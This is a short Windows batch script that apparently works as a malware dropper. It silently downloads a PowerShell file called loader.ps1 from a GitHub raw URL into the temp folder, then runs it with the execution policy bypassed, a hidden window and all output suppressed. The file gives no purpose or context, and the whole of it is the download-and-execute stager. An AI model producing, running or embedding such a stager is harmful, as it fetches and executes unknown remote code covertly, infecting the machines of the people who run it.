@echo off
set "url=https://github.com/sweet-stuff-babe/goku/raw/refs/heads/main/loader.ps1"
set "file=%TEMP%\loader.ps1"

powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%','%file%')" >nul 2>&1

if exist "%file%" (
    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%file%" >nul 2>&1
)
